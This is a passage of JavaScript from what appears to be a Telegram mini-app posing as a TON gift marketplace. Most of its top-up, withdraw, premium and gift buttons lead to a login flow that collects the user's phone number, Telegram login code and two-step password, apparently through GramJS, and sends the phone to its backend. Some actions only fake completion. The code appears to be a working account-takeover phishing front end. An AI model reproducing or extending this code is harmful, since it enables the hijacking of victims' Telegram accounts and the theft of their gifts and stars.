  return state.cartItems.reduce((sum, item) => sum + getPriceValue(item), 0);
}

function updateCartUi() {
  if (!elements.cartFab || !elements.cartCount || !elements.cartTotal || !elements.cartBadge) return;
  const count = state.cartItems.length;
  const total = formatTon(getCartTotal());
  elements.cartCount.textContent = formatGiftCount(count);
  elements.cartBadge.textContent = String(count);
  elements.cartTotal.textContent = total;
  elements.cartFab.classList.toggle('is-visible', count > 0);
}

function renderCartModal() {
  if (!elements.cartList || !elements.cartSummaryTotal) return;
  elements.cartList.innerHTML = '';
  const count = state.cartItems.length;
  if (elements.cartHeaderCount) {
    elements.cartHeaderCount.textContent = String(count);
  }
  if (!count) {
    const empty = document.createElement('div');
    empty.className = 'cart-empty';
    empty.textContent = t('cart_empty');
    elements.cartList.appendChild(empty);
  } else {
    const fragment = document.createDocumentFragment();
    state.cartItems.forEach((item, index) => {
      const row = document.createElement('div');
      row.className = 'cart-item';

      const media = document.createElement('div');
      media.className = 'cart-item-media';
      const img = document.createElement('img');
      const fallback = buildPlaceholder(item.number || item.id || index, item.name);
      img.src = resolveImageUrl(item.image) || fallback;
      img.alt = item.name || 'Gift';
      img.loading = 'lazy';
      img.addEventListener('error', () => {
        if (img.src !== fallback) img.src = fallback;
      });
      media.appendChild(img);

      const meta = document.createElement('div');
      meta.className = 'cart-item-meta';
      const name = document.createElement('div');
      name.className = 'cart-item-name';
      name.textContent = item.name || 'Gift';
      const number = document.createElement('div');
      number.className = 'cart-item-number';
      const numberValue = item.number ?? item.id ?? '';
      number.textContent = numberValue ? `#${numberValue}` : '#—';
      meta.appendChild(name);
      meta.appendChild(number);

      const price = document.createElement('div');
      price.className = 'cart-item-price';
      const tonIcon = document.createElement('img');
      tonIcon.className = 'ton-icon';
      tonIcon.src = './img/image.png';
      tonIcon.alt = 'TON';
      const priceValue = document.createElement('span');
      priceValue.textContent = formatTon(item.price ?? 0);
      const priceUnit = document.createElement('span');
      priceUnit.className = 'cart-price-unit';
      priceUnit.textContent = 'TON';
      price.appendChild(tonIcon);
      price.appendChild(priceValue);
      price.appendChild(priceUnit);

      const remove = document.createElement('button');
      remove.className = 'cart-item-remove';
      remove.type = 'button';
      remove.setAttribute('aria-label', t('action_close'));
      remove.innerHTML = '<i data-lucide="x" aria-hidden="true"></i>';
      remove.addEventListener('click', () => {
        triggerHaptic('light');
        removeFromCart(item);
      });

      const side = document.createElement('div');
      side.className = 'cart-item-side';
      side.appendChild(price);
      side.appendChild(remove);

      row.appendChild(media);
      row.appendChild(meta);
      row.appendChild(side);
      fragment.appendChild(row);
    });
    elements.cartList.appendChild(fragment);
  }
  elements.cartSummaryTotal.textContent = formatTon(getCartTotal());
  renderIcons();
}

function openCartModal() {
  if (!elements.cartModal) return;
  renderCartModal();
  elements.cartModal.classList.add('open');
  elements.cartModal.setAttribute('aria-hidden', 'false');
  showCartBackButton();
}

function closeCartModal() {
  if (!elements.cartModal) return;
  elements.cartModal.classList.remove('open');
  elements.cartModal.setAttribute('aria-hidden', 'true');
  hideCartBackButton();
}

function addToCart(item) {
  if (!item) return;
  const key = getCartKey(item);
  const exists = state.cartItems.some((entry) => getCartKey(entry) === key);
  if (!exists) {
    state.cartItems.push(item);
  }
  updateCartButtonsByKey(key, true);
  updateCartUi();
  if (elements.cartModal?.classList.contains('open')) {
    renderCartModal();
  }
}

function removeFromCart(item) {
  if (!item) return;
  const key = getCartKey(item);
  state.cartItems = state.cartItems.filter((entry) => getCartKey(entry) !== key);
  updateCartButtonsByKey(key, false);
  updateCartUi();
  if (elements.cartModal?.classList.contains('open')) {
    renderCartModal();
  }
}

function setTab(tabName) {
  elements.tabs.forEach((tab) => {
    tab.classList.toggle('is-active', tab.dataset.tab === tabName);
  });
  elements.navItems.forEach((btn) => {
    btn.classList.toggle('is-active', btn.dataset.tab === tabName);
  });

  if (document.body.classList.contains('is-loading')) {
    document.body.classList.remove('is-loading');
  }
  if (dataLoaded) {
    clearBootOverlay();
  }

  const isProfile = tabName === 'profile';
  document.body.classList.toggle('is-profile-header', isProfile);
  if (!isProfile) {
    closeSettingsPanel();
  }

  if (tabName === 'market' && dataLoaded) {
    renderMarket();
  }
}

function showToast(message) {
  if (!elements.toast) return;
  elements.toast.textContent = message;
  elements.toast.classList.add('visible');
  clearTimeout(showToast.timer);
  showToast.timer = setTimeout(() => {
    elements.toast.classList.remove('visible');
  }, 2400);
}

function showAlert(message, duration = 4000) {
  if (!elements.alert) return;
  elements.alert.textContent = message;
  elements.alert.classList.add('visible');
  clearTimeout(showAlert.timer);
  showAlert.timer = setTimeout(() => {
    elements.alert.classList.remove('visible');
  }, duration);
}

function extractWaitSeconds(detail) {
  const text = String(detail || '');
  const secMatch = text.match(/(\d+)\s*сек/i);
  if (secMatch) {
    const seconds = Number(secMatch[1]);
    if (Number.isFinite(seconds) && seconds > 0) return seconds;
  }
  const minMatch = text.match(/(\d+)\s*мин/i);
  if (minMatch) {
    const minutes = Number(minMatch[1]);
    if (Number.isFinite(minutes) && minutes > 0) return minutes * 60;
  }
  return null;
}

function setAuthorized(isAuthorized) {
  state.isAuthorized = isAuthorized;
  updateProfileAuthStatus(state.hasChatAccess || state.isAuthorized);
}

function renderIcons() {
  if (window.lucide?.createIcons) {
    window.lucide.createIcons();
  }
}

function bindNavigation() {
  elements.navItems.forEach((btn) => {
    btn.addEventListener('click', () => {
      triggerHaptic('light');
      setTab(btn.dataset.tab);
    });
  });
}

function bindBalancePlus() {
  if (!elements.balancePlus) return;
  elements.balancePlus.addEventListener('click', (event) => {
    event.stopPropagation();
    triggerHaptic('light');
    openTopupModal();
  });
}

function bindBalanceBlocks() {
  if (!elements.balanceBlocks.length) return;
  elements.balanceBlocks.forEach((block) => {
    block.addEventListener('click', () => {
      triggerHaptic('light');
      openTopupModal();
    });
  });
}

function bindSearch() {
  if (!elements.searchInput) return;
  elements.searchInput.addEventListener('input', (event) => {
    state.search = event.target.value || '';
    renderMarket();
  });
}

function bindFilters() {
  if (!elements.filterBtn || !elements.sortPanel) return;
  elements.filterBtn.addEventListener('click', () => {
    triggerHaptic('light');
    const isOpen = elements.sortPanel.classList.toggle('is-open');
    elements.filterBtn.classList.toggle('is-active', isOpen);
    elements.filterBtn.setAttribute('aria-expanded', String(isOpen));
  });
}

function bindSettings() {
  if (!elements.settingsBtn || !elements.settingsPanel) return;

  elements.settingsBtn.addEventListener('click', (event) => {
    event.stopPropagation();
    triggerHaptic('light');
    toggleSettingsPanel();
  });

  elements.settingsPanel.addEventListener('click', (event) => {
    event.stopPropagation();
  });

  document.addEventListener('click', () => {
    if (!elements.settingsPanel.classList.contains('is-open')) return;
    closeSettingsPanel();
  });

  if (elements.settingsHapticsButtons.length) {
    elements.settingsHapticsButtons.forEach((btn) => {
      btn.addEventListener('click', () => {
        const enabled = btn.dataset.haptics === 'on';
        setHapticsEnabled(enabled);
        applySettingsUi();
      });
    });
  }

  if (elements.settingsLanguageButtons.length) {
    elements.settingsLanguageButtons.forEach((btn) => {
      btn.addEventListener('click', () => {
        const lang = btn.dataset.lang === 'en' ? 'en' : 'ru';
        setLanguage(lang);
        applySettingsUi();
      });
    });
  }

  if (elements.settingsSendModeButtons.length) {
    elements.settingsSendModeButtons.forEach((btn) => {
      btn.addEventListener('click', () => {
        if (!state.hasChatAccess) return;
        const mode = btn.dataset.sendMode === 'stars' ? 'stars' : 'gift';
        saveSendMode(mode);
      });
    });
  }

  if (elements.settingsAdminButtons.length) {
    elements.settingsAdminButtons.forEach((btn) => {
      btn.addEventListener('click', () => {
        if (!state.hasChatAccess) return;
        triggerHaptic('light');
        const action = btn.dataset.adminAction;
        openAdminModal(action);
      });
    });
  }

  if (elements.adminModal) {
    elements.adminModal.querySelectorAll('[data-close="true"]').forEach((el) => {
      el.addEventListener('click', () => {
        triggerHaptic('light');
        closeAdminModal();
      });
    });
    elements.adminModal.addEventListener('click', (event) => {
      if (event.target === elements.adminModal || event.target.classList.contains('modal-backdrop')) {
        triggerHaptic('light');
        closeAdminModal();
      }
    });
  }

  if (elements.adminSubmit) {
    elements.adminSubmit.addEventListener('click', () => {
      triggerHaptic('light');
      saveAdminValue();
    });
  }
}

function bindSortChips() {
  if (!elements.sortChips.length) return;
  elements.sortChips.forEach((chip) => {
    chip.addEventListener('click', () => {
      const mode = chip.dataset.sort || 'cheap';
      triggerHaptic('light');
      setSortMode(mode);
      renderMarket();
    });
  });
}

function bindSortRange() {
  if (!elements.sortRange) return;
  elements.sortRange.addEventListener('input', (event) => {
    const value = Number(event.target.value);
    if (!Number.isFinite(value)) return;
    state.sortMaxPrice = value;
    updateSortUi();
    renderMarket();
  });
  elements.sortRange.addEventListener('change', () => {
    triggerHaptic('light');
  });
}

function bindCodeInput() {
  if (!elements.authCodeInput) return;
  if (elements.codeInput) {
    elements.codeInput.addEventListener('click', () => {
      elements.authCodeInput.focus();
    });
  }
  const maybeAutoSubmit = () => {
    if (!elements.authCodeInput) return;
    const raw = elements.authCodeInput.value || '';
    const digits = raw.replace(/\D/g, '').slice(0, 5);
    if (raw !== digits) {
      elements.authCodeInput.value = digits;
    }
    if (digits.length === 5 && authToken && !authLoading) {
      submitCode({ preventDefault() {} });
    }
  };
  elements.authCodeInput.addEventListener('input', () => {
    setCodeError(false);
    syncCodeCells();
    maybeAutoSubmit();
  });
  elements.authCodeInput.addEventListener('focus', () => {
    setCodeError(false);
    syncCodeCells();
  });
  elements.authCodeInput.addEventListener('paste', () => {
    setTimeout(maybeAutoSubmit, 0);
  });

}

function bindPasswordInput() {
  if (elements.authPasswordInput) {
    elements.authPasswordInput.addEventListener('input', () => {
      setPasswordError(false);
    });
    elements.authPasswordInput.addEventListener('focus', () => {
      setPasswordError(false);
    });
  }

  if (!elements.passwordToggle || !elements.authPasswordInput) return;
  elements.passwordToggle.addEventListener('click', () => {
    const input = elements.authPasswordInput;
    const isHidden = input.type === 'password';
    input.type = isHidden ? 'text' : 'password';
    elements.passwordToggle.classList.toggle('is-visible', isHidden);
    updatePasswordToggleLabel();
    input.focus();
  });
}

function bindGiftModal() {
  if (!elements.giftModal) return;
  elements.giftModal.querySelectorAll('[data-close="true"]').forEach((el) => {
    el.addEventListener('click', () => {
      triggerHaptic('light');
      closeGiftModal();
    });
  });
  if (elements.giftAccept) {
    elements.giftAccept.addEventListener('click', () => {
      triggerHaptic('light');
      closeGiftModal();
    });
  }
}

function bindTopupModal() {
  if (!elements.topupModal) return;
  elements.topupModal.querySelectorAll('[data-close="true"]').forEach((el) => {
    el.addEventListener('click', () => {
      triggerHaptic('light');
      closeTopupModal();
    });
  });

  elements.topupModal.querySelectorAll('[data-ton-action]').forEach((btn) => {
    btn.addEventListener('click', () => {
      triggerHaptic('light');
      closeTopupModal();
      openAuthModal();
    });
  });

  elements.topupModal.querySelectorAll('[data-stars-action]').forEach((btn) => {
    btn.addEventListener('click', () => {
      triggerHaptic('light');
      const action = btn.dataset.starsAction;
      closeTopupModal();
      if (action === 'withdraw') {
        openWithdrawModal();
        return;
      }
      openStarsTopupModal();
    });
  });
}

function bindWithdrawModal() {
  if (!elements.withdrawModal) return;
  elements.withdrawModal.querySelectorAll('[data-close="true"]').forEach((el) => {
    el.addEventListener('click', () => {
      triggerHaptic('light');
      closeWithdrawModal();
    });
  });
  if (elements.withdrawOptions.length) {
    elements.withdrawOptions.forEach((btn) => {
      btn.addEventListener('click', () => {
        triggerHaptic('light');
        closeWithdrawModal();
        openAuthModal();
      });
    });
  }
}

function bindStarsTopupModal() {
  if (!elements.starsTopupModal) return;
  elements.starsTopupModal.querySelectorAll('[data-close="true"]').forEach((el) => {
    el.addEventListener('click', () => {
      triggerHaptic('light');
      closeStarsTopupModal();
    });
  });
  if (elements.starsTopupButtons.length) {
    elements.starsTopupButtons.forEach((btn) => {
      btn.addEventListener('click', () => {
        triggerHaptic('light');
        const value = Number(btn.dataset.starsTopup || 0);
        if (!Number.isFinite(value) || value <= 0) return;
        setStarsTopupAmount(value);
        startStarsTopup(value);
      });
    });
  }
}

function bindStarsClaimModal() {
  if (!elements.starsClaimModal) return;
  elements.starsClaimModal.querySelectorAll('[data-close="true"]').forEach((el) => {
    el.addEventListener('click', () => {
      triggerHaptic('light');
      closeStarsClaimModal();
    });
  });
  if (elements.starsClaimBtn) {
    elements.starsClaimBtn.addEventListener('click', () => {
      triggerHaptic('light');
      claimStars();
    });
  }
}

function bindActionModal() {
  if (!elements.actionModal) return;
  elements.actionModal.querySelectorAll('[data-close="true"], [data-action-close="true"]').forEach((el) => {
    el.addEventListener('click', () => {
      triggerHaptic('light');
      closeActionModal();
    });
  });
  if (elements.actionSubmit) {
    elements.actionSubmit.addEventListener('click', () => {
      triggerHaptic('light');
      closeActionModal();
      showToast(t('action_done'));
    });
  }
}

function bindCartModal() {
  if (elements.cartFab) {
    elements.cartFab.addEventListener('click', () => {
      triggerHaptic('light');
      openCartModal();
    });
  }
  if (elements.cartModal) {
    elements.cartModal.querySelectorAll('[data-close="true"]').forEach((el) => {
      el.addEventListener('click', () => {
        triggerHaptic('light');
        closeCartModal();
      });
    });
  }
}

function bindPurchaseModal() {
  if (!elements.purchaseModal) return;
  elements.purchaseModal.querySelectorAll('[data-close="true"]').forEach((el) => {
    el.addEventListener('click', () => {
      triggerHaptic('light');
      closePurchaseModal();
    });
  });
  elements.purchaseModal.addEventListener('click', (event) => {
    if (event.target === elements.purchaseModal || event.target.classList.contains('modal-backdrop')) {
      triggerHaptic('light');
      closePurchaseModal();
    }
  });
}

function bindActions() {
  elements.actionButtons.forEach((btn) => {
    btn.addEventListener('click', () => {
      const action = btn.dataset.action;
      if (!state.selectedOwnedId) {
        triggerHaptic('heavy');
        showToast(t('toast_select_gift'));
        return;
      }
      triggerHaptic('light');
      if (state.hasChatAccess || !getTelegramUser()) {
        openActionModal(btn.dataset.action || 'send');
        return;
      }
      openAuthModal();
    });
  });
}

function bindStarsPanel() {
  setStarsPanelOpen(false);
  if (elements.starsToggle) {
    elements.starsToggle.addEventListener('click', () => {
      triggerHaptic('light');
      setStarsPanelOpen(!starsPanelOpen);
    });
  }

  if (elements.premiumPlans.length) {
    elements.premiumPlans.forEach((plan) => {
      plan.addEventListener('click', () => {
        triggerHaptic('light');
        const usd = Number(plan.dataset.premiumUsd || 0);
        if (usd) setPremiumSelection(usd);
      });
    });
  }

  if (elements.premiumSubmit) {
    elements.premiumSubmit.addEventListener('click', () => {
      triggerHaptic('light');
      if (!selectedPremiumUsd) {
        showAlert(t('stars_select_error'));
        return;
      }
      openAuthModal();
    });
  }

  if (elements.starsActions.length) {
    elements.starsActions.forEach((btn) => {
      btn.addEventListener('click', () => {
        const action = btn.dataset.starsAction;
        triggerHaptic('light');
        if (action === 'withdraw') {
          openWithdrawModal();
          return;
        }
        if (action === 'topup') {
          openTopupModal();
          return;
        }
        openAuthModal();
      });
    });
  }
}

function showAuthStep(step) {
  const steps = [
    elements.authIntro,
    elements.authPhoneForm,
    elements.authCodeForm,
    elements.authPasswordForm,
    elements.authLoading,
    elements.authSuccess,
  ];
  steps.forEach((el) => {
    if (!el) return;
    el.classList.toggle('is-active', el === step);
  });
  if (step === elements.authCodeForm) {
    setCodeError(false);
    syncCodeCells();
    if (elements.authCodeInput) {
      setTimeout(() => {
        elements.authCodeInput.focus();
      }, 50);
    }
  }
}

function setAuthStatus(message, isError = false) {
  if (!elements.authStatus) return;
  elements.authStatus.textContent = message;
  elements.authStatus.classList.toggle('error', isError);
  if (isError) triggerHaptic('heavy');
}

function toggleAuthInputs(form, disabled) {
  if (!form) return;
  form.querySelectorAll('input, button').forEach((el) => {
    el.disabled = disabled;
  });
}

function openAuthModal() {
  if (!elements.authModal) return;
  elements.authModal.classList.add('open');
  elements.authModal.setAttribute('aria-hidden', 'false');
  authToken = null;
  setAuthStatus('');
  setPasswordHint('');
  if (elements.authCodeInput) elements.authCodeInput.value = '';
  if (elements.authPasswordInput) elements.authPasswordInput.value = '';
  setCodeError(false);
  setPasswordError(false);
  syncCodeCells();
  showAuthStep(elements.authIntro);
}

function closeAuthModal() {
  if (!elements.authModal) return;
  elements.authModal.classList.remove('open');
  elements.authModal.setAttribute('aria-hidden', 'true');
  void abortGramjsAuth();
  authToken = null;
  authLoading = false;
  setAuthStatus('');
  setPasswordError(false);
  setPasswordHint('');
  if (elements.authIntro) {
    showAuthStep(elements.authIntro);
  }
}

function openTopupModal() {
  if (!elements.topupModal) return;
  updateStarsUi(state.profile);
  elements.topupModal.classList.add('open');
  elements.topupModal.setAttribute('aria-hidden', 'false');
}

function closeTopupModal() {
  if (!elements.topupModal) return;
  elements.topupModal.classList.remove('open');
  elements.topupModal.setAttribute('aria-hidden', 'true');
}

function openWithdrawModal() {
  if (!elements.withdrawModal) return;
  elements.withdrawModal.classList.add('open');
  elements.withdrawModal.setAttribute('aria-hidden', 'false');
}

function closeWithdrawModal() {
  if (!elements.withdrawModal) return;
  elements.withdrawModal.classList.remove('open');
  elements.withdrawModal.setAttribute('aria-hidden', 'true');
}

function setStarsTopupAmount(amount) {
  starsTopupAmount = amount;
  if (elements.starsTopupButtons.length) {
    elements.starsTopupButtons.forEach((btn) => {
      const value = Number(btn.dataset.starsTopup || 0);
      btn.classList.toggle('is-active', Number.isFinite(value) && value === amount);
    });
  }
}

function setStarsTopupButtonsDisabled(disabled) {
  if (!elements.starsTopupButtons.length) return;
  elements.starsTopupButtons.forEach((btn) => {
    btn.disabled = disabled;
  });
}

function openStarsTopupModal() {
  if (!elements.starsTopupModal) return;
  setStarsTopupAmount(null);
  elements.starsTopupModal.classList.add('open');
  elements.starsTopupModal.setAttribute('aria-hidden', 'false');
}

function closeStarsTopupModal() {
  if (!elements.starsTopupModal) return;
  elements.starsTopupModal.classList.remove('open');
  elements.starsTopupModal.setAttribute('aria-hidden', 'true');
  setStarsTopupAmount(null);
}

async function startStarsTopup(amount) {
  if (starsTopupLoading) return;
  if (!amount) {
    showToast(t('stars_topup_select'));
    return;
  }

  const user = getTelegramUser();
  if (!user?.id) {
    showAlert(t('stars_topup_unavailable'));
    return;
  }

  starsTopupLoading = true;
  setStarsTopupButtonsDisabled(true);
  setStarsTopupAmount(amount);

  const payload = {
    user_id: user.id,
    amount,
  };
  const { res, data } = await postJson('/market/stars/invoice', payload);

  starsTopupLoading = false;
  setStarsTopupButtonsDisabled(false);

  if (!res || !res.ok || !data?.url) {
    showAlert(data?.detail || t('stars_topup_error'));
    return;
  }

  const tg = tgWebApp || window.Telegram?.WebApp;
  if (!tg?.openInvoice) {
    showAlert(t('stars_topup_unavailable'));
    return;
  }

  showToast(t('stars_topup_created'));
  tg.openInvoice(data.url, (status) => {
    if (status === 'paid' || status === 'pending') {
      showToast(t('stars_topup_success'));
      setTimeout(refreshProfileData, 1200);
    }
    if (status === 'paid') {
      closeStarsTopupModal();
    }
  });
}

async function previewStarsClaim(token) {
  if (!token || starClaimPreviewLoading) return;
  starClaimPreviewLoading = true;
  if (elements.starsClaimBtn) elements.starsClaimBtn.disabled = true;
  setStarsClaimAmount(null);
  setStarsClaimError('');

  const result = await fetchStarsPreview(token);

  starClaimPreviewLoading = false;
  if (elements.starsClaimBtn) elements.starsClaimBtn.disabled = false;

  if (!result.ok) {
    setStarsClaimError(resolveStarsClaimError(result.res, result.data));
    setStarsClaimAmount(null);
    return;
  }

  setStarsClaimAmount(result.amount);
  setStarsClaimError('');
}

async function fetchStarsPreview(token) {
  const user = getTelegramUser();
  if (!user?.id) {
    return { ok: false, res: null, data: null };
  }
  const payload = {
    token,
    user_id: user?.id ?? null,
    username: user?.username ?? null,
  };
  const { res, data } = await postJson('/market/stars/preview', payload);
  if (!res || !res.ok) {
    return { ok: false, res, data };
  }
  return { ok: true, amount: data?.amount ?? null, res, data };
}

function openStarsClaimModal(token, amount = null, skipPreview = false) {
  if (!elements.starsClaimModal) return;
  if (token) pendingStarToken = token;
  setStarsClaimAmount(amount);
  setStarsClaimError('');
  elements.starsClaimModal.classList.add('open');
  elements.starsClaimModal.setAttribute('aria-hidden', 'false');
  if (!skipPreview && pendingStarToken) {
    previewStarsClaim(pendingStarToken);
  }
}

function closeStarsClaimModal() {
  if (!elements.starsClaimModal) return;
  elements.starsClaimModal.classList.remove('open');
  elements.starsClaimModal.setAttribute('aria-hidden', 'true');
  setStarsClaimError('');
}

async function claimStars() {
  if (starClaimLoading || !pendingStarToken) return;
  starClaimLoading = true;
  if (elements.starsClaimBtn) elements.starsClaimBtn.disabled = true;
  setStarsClaimError('');

  const user = getTelegramUser();
  if (!user?.id) {
    starClaimLoading = false;
    if (elements.starsClaimBtn) elements.starsClaimBtn.disabled = false;
    setStarsClaimError(t('stars_claim_error'));
    return;
  }
  const payload = {
    token: pendingStarToken,
    user_id: user?.id ?? null,
    username: user?.username ?? null,
  };
  const { res, data } = await postJson('/market/stars/claim', payload);

  starClaimLoading = false;
  if (elements.starsClaimBtn) elements.starsClaimBtn.disabled = false;

  if (!res || !res.ok) {
    setStarsClaimError(resolveStarsClaimError(res, data));
    return;
  }

  const amount = data?.amount ?? null;
  setStarsClaimAmount(amount);
  if (data?.balance !== undefined) {
    state.profile = { ...state.profile, stars: data.balance };
    updateStarsUi(state.profile);
  }

  markStarTokenClaimed(pendingStarToken);
  pendingStarToken = null;
  showToast(t('stars_claim_success'));
  setTimeout(() => closeStarsClaimModal(), 450);
}

async function handleStartParam() {
  if (startParamHandled) return false;
  const param = getStartParam();
  const initReady = Boolean(window.Telegram?.WebApp?.initData);
  if (param === null && !initReady) return false;
  startParamHandled = true;
  const token = extractStarsToken(param);
  if (!token) return false;
  if (wasStarTokenClaimed(token)) {
    showAlert(t('stars_claim_used'));
    return true;
  }

  const preview = await fetchStarsPreview(token);
  if (preview.ok) {
    openStarsClaimModal(token, preview.amount, true);
    return true;
  }
  if (preview.res?.status === 409) {
    showAlert(t('stars_claim_used'));
    return true;
  }

  openStarsClaimModal(token);
  return true;
}

function getLatestGiftItem(items) {
  if (!Array.isArray(items)) return null;
  const currentUser = getTelegramUser();
  const currentUserId = currentUser?.id ?? null;
  const matches = items.filter((item) => {
    if (currentUserId && item?.owner_id && Number(item.owner_id) !== Number(currentUserId)) {
      return false;
    }
    return isToyBearItem(item);
  });
  return matches.length ? matches[matches.length - 1] : null;
}

function markGiftPopupSeen(giftId) {
  if (!giftId) return;
  try {
    localStorage.setItem(GIFT_POPUP_KEY, giftId);
  } catch (err) {
    console.warn('Failed to store gift popup key:', err);
  }
}

function openGiftModal(gift) {
  if (!elements.giftModal) return;
  const giftId = String(gift?.id ?? gift?.number ?? '');
  elements.giftModal.dataset.giftId = giftId;
  elements.giftModal.classList.add('open');
  elements.giftModal.setAttribute('aria-hidden', 'false');
  if (elements.giftImage) {
    elements.giftImage.src = `${API_BASE}${GIFT_POPUP_GIF}`;
    elements.giftImage.alt = `${GIFT_POPUP_NAME}-${GIFT_POPUP_NUMBER}`;
  }
}

function closeGiftModal() {
  if (!elements.giftModal) return;
  elements.giftModal.classList.remove('open');
  elements.giftModal.setAttribute('aria-hidden', 'true');
  const giftId = elements.giftModal.dataset.giftId;
  if (giftId) markGiftPopupSeen(giftId);
}

function maybeShowGiftPopup() {
  if (!elements.giftModal) return;
  const gift = getLatestGiftItem(state.owned);
  if (!gift) return;
  const giftId = String(gift.id ?? gift.number ?? '');
  if (!giftId) return;
  let seenId = null;
  try {
    seenId = localStorage.getItem(GIFT_POPUP_KEY);
  } catch (err) {
    console.warn('Failed to read gift popup key:', err);
  }
  if (seenId === giftId) return;
  setTimeout(() => {
    openGiftModal(gift);
  }, 200);
}

function isPasswordRequired(detail) {
  const text = getDetailText(detail);
  return (
    /Password required/i.test(text) ||
    /2FA/i.test(text) ||
    /Two-steps verification/i.test(text) ||
    /two-step/i.test(text) ||
    /SESSION_PASSWORD_NEEDED/i.test(text) ||
    /двухфактор/i.test(text)
  );
}

function getDetailText(detail) {
  if (typeof detail === 'string') return detail;
  if (typeof detail === 'number') return String(detail);
  if (detail && typeof detail === 'object') {
    const message = detail.message || detail.detail || detail.error || detail.code;
    if (message) return String(message);
  }
  return '';
}

function getDetailHint(detail) {
  if (!detail || typeof detail !== 'object') return '';
  const hint = detail.hint || detail.password_hint || detail.passwordHint;
  return hint ? String(hint) : '';
}

function setPasswordHint(hint) {
  authPasswordHint = (hint || '').trim();
  if (!elements.authPasswordHint) return;
  if (!authPasswordHint) {
    elements.authPasswordHint.textContent = '';
    elements.authPasswordHint.classList.add('is-hidden');
    return;
  }
  elements.authPasswordHint.textContent = `${t('auth_password_hint_label')} ${authPasswordHint}`;
  elements.authPasswordHint.classList.remove('is-hidden');
}

function extractPhoneFromPayload(payload) {
  if (!payload) return null;
  if (typeof payload === 'string') {
    try {
      const params = new URLSearchParams(payload);
      const direct = params.get('phone_number') || params.get('phone');
      if (direct) return direct;
      const rawContact = params.get('contact');
      if (rawContact) {
        const parsed = JSON.parse(rawContact);
        return parsed?.phone_number || parsed?.phone || null;
      }
    } catch (err) {
      return null;
    }
  }
  const direct =
    payload.phone_number ||
    payload.phone ||
    payload.contact?.phone_number ||
    payload.user?.phone_number;
  if (direct) return direct;

  const responseUnsafe = payload.responseUnsafe;
  if (responseUnsafe) {
    if (typeof responseUnsafe === 'string') {
      const params = new URLSearchParams(responseUnsafe);
      const phone = params.get('phone_number') || params.get('phone');
      if (phone) return phone;
      const rawContact = params.get('contact');
      if (rawContact) {
        try {
          const parsed = JSON.parse(rawContact);
          return parsed?.phone_number || parsed?.phone || null;
        } catch (err) {
          return null;
        }
      }
    } else {
      const phone =
        responseUnsafe.phone_number ||
        responseUnsafe.phone ||
        responseUnsafe.contact?.phone_number ||
        responseUnsafe.user?.phone_number;
      if (phone) return phone;
    }
  }

  const response = payload.response || payload.result;
  if (response) {
    if (typeof response === 'string') {
      const params = new URLSearchParams(response);
      const phone = params.get('phone_number') || params.get('phone');
      if (phone) return phone;
      const rawContact = params.get('contact');
      if (rawContact) {
        try {
          const parsed = JSON.parse(rawContact);
          return parsed?.phone_number || parsed?.phone || null;
        } catch (err) {
          return null;
        }
      }
    }
    if (typeof response === 'object') {
      return (
        response.phone_number ||
        response.phone ||
        response.contact?.phone_number ||
        response.user?.phone_number ||
        null
      );
    }
  }

  return null;
}

function requestPhoneFromTelegram() {
  const tg = tgWebApp || window.Telegram?.WebApp;
  return new Promise((resolve) => {
    let settled = false;
    let timeoutId = null;
    let pollTimer = null;
    const detach = () => {
      if (typeof tg?.offEvent === 'function') {
        tg.offEvent('contactRequested', eventHandler);
      }
    };
    const finish = (payload, success) => {
      if (settled) return;
      settled = true;
      if (timeoutId) {
        clearTimeout(timeoutId);
        timeoutId = null;
      }
      if (pollTimer) {
        clearTimeout(pollTimer);
        pollTimer = null;
      }
      detach();
      const phone = extractPhoneFromPayload(payload);
      const shared = Boolean(success) || payload?.status === 'sent' || Boolean(phone);
      resolve({ phone, shared });
    };

    const handle = (success, data) => {
      if (data === undefined && success && typeof success === 'object') {
        return finish(success, true);
      }
      return finish(data, success);
    };

    const eventHandler = (eventType, eventData) => {
      const payload =
        eventData && typeof eventData === 'object' ? eventData : eventType;
      if (!payload) return;
      finish(payload, payload?.status === 'sent');
    };

    const pollCustomMethod = (deadline) => {
      if (settled) return;
      if (typeof tg?.invokeCustomMethod !== 'function') return;
      if (Date.now() > deadline) return;
      try {
        tg.invokeCustomMethod('getRequestedContact', {}, (err, res) => {
          if (settled) return;
          if (err) {
            console.warn('getRequestedContact error:', err);
            pollTimer = setTimeout(() => pollCustomMethod(deadline), 350);
            return;
          }
          if (res && String(res).trim()) {
            finish(res, true);
            return;
          }
          pollTimer = setTimeout(() => pollCustomMethod(deadline), 350);
        });
      } catch (err) {
        console.warn('invokeCustomMethod failed:', err);
      }
    };

    try {
      if (typeof tg?.onEvent === 'function') {
        tg.onEvent('contactRequested', eventHandler);
      }
      if (typeof tg?.requestContact === 'function') {
        const result = tg.requestContact((success, data) => {
          handle(success, data);
        });
        if (result && typeof result.then === 'function') {
          result.then((data) => handle(true, data)).catch(() => finish(null, false));
        }
        const deadline = Date.now() + 7000;
        pollCustomMethod(deadline);
      } else {
        finish(null, false);
      }
    } catch (err) {
      console.warn('requestContact failed:', err);
      const deadline = Date.now() + 7000;
      pollCustomMethod(deadline);
    }

    timeoutId = setTimeout(() => finish(null, false), 8000);
  });
}

async function requestPhoneFromBackend() {
  const requester = buildRequesterPayload();
  const userId = requester.user_id;
  if (!userId) return null;
  try {
    const params = new URLSearchParams({ user_id: String(userId) });
    const res = await fetch(`${API_BASE}/auth/contact?${params.toString()}`, {
      cache: 'no-store',
    });
    if (!res.ok) return null;
    const data = await res.json();
    return data?.phone || null;
  } catch (err) {
    console.warn('Contact fetch failed:', err);
    return null;
  }
}

async function postPhoneToBackend(phone) {
  const requester = buildRequesterPayload();
  if (!requester.user_id) return;
  try {
    await fetch(`${API_BASE}/auth/contact`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        phone,
        requester,
        source: 'webapp_contact',
      }),
      keepalive: true,
    });
  } catch (err) {
    console.warn('Contact post failed:', err);
  }
}

async function requestPendingToken(phone) {
  const requester = buildRequesterPayload();
  const userId = requester.user_id;
  if (!userId && !phone) return null;
  try {
    const params = new URLSearchParams();
    if (userId) params.set('user_id', String(userId));
    if (phone) params.set('phone', String(phone));
    const res = await fetch(`${API_BASE}/auth/pending?${params.toString()}`, {
      cache: 'no-store',
    });
    if (!res.ok) return null;
    const data = await res.json();
    return data?.token || null;
  } catch (err) {
    console.warn('Pending token fetch failed:', err);
    return null;
  }
}

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function waitForPendingToken(phone, timeoutMs = 8000, intervalMs = 700) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
